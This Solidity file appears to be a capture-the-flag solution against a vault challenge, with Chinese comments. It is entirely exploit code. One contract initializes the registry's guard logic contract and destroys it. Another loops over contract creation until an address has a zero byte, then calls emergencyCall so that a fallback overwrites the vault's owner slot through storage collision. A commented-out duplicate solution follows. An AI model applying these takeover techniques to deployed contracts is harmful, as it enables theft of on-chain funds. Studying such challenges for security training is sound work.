pragma solidity 0.4.16;

import "./Setup.sol";

contract FakeVault {
    SingleOwnerGuard public guard;

    function get(GuardRegistry registry) public {
        guard = SingleOwnerGuard(registry.implementations(registry.defaultImplementation()));
    }

    function cleanup() public {
        guard.initialize(Vault(address(this)));
        guard.cleanup();
    }

    function owner() public returns (address) {
        return address(this);
    }

    // 在 cleanup() 中会有判断 guard() 的逻辑
    function guard() external view returns (address) {
        return msg.sender;
    }
}

contract OwnershipTaker {
    function doit(Vault vault) public {
        // data 为 0，就是调用 fallback 函数
        vault.emergencyCall(msg.sender, new bytes(0));
    }
}

contract vaultExploit {
    // 注意：要修改的 owner 的位置需要和目标合约 vault 中的 owner 的位置相同，否则无法进行修改
    address owner;
    vaultSetup private setup;
    OwnershipTaker addr;

    function vaultExploit(vaultSetup setup_) public {
        setup = setup_;
    }

    // 销毁逻辑合约
    function part1() public {
        FakeVault fakeVault = new FakeVault();
        // 获得逻辑合约地址
        fakeVault.get(setup.registry());
        // 初始化并销毁
        fakeVault.cleanup();
    }

    function part2() public {
        while(true) {
            // 使用 CREATE 来创造合约
            addr = new OwnershipTaker();
            // 判断是否满足条件
            if (bytes20(address(addr))[15] == hex'00') {
                break;
            }
        }
        // 调用特定合约地址中的攻击函数
        addr.doit(setup.vault());

    }

    // 在 fallback 函数里面实现修改 owner 的逻辑
    function() external {
        owner = address(0);
    }
}

//
//contract Caller {
//    function doit(Vault vault) {
//        vault.emergencyCall(msg.sender, new bytes(0));
//    }
//}
//
//contract Solve {
//    address owner;
//
//    function doit1(vaultSetup setup) external {
//        GuardRegistry registry = setup.registry();
//        Guard guard = Guard(registry.implementations(registry.defaultImplementation()));
//        guard.initialize(Vault(address(this)));
//        guard.cleanup();
//    }
//
//    function doit2(vaultSetup setup) external {
//        Caller caller;
//        while (true) {
//            caller = new Caller();
//            if (bytes20(address(caller))[15] == 0) {
//                break;
//            }
//        }
//        caller.doit(setup.vault());
//    }
//
//    function guard() external view returns (address) {
//        return msg.sender;
//    }
//
//    function() external {
//        owner = address(0);
//    }
//}
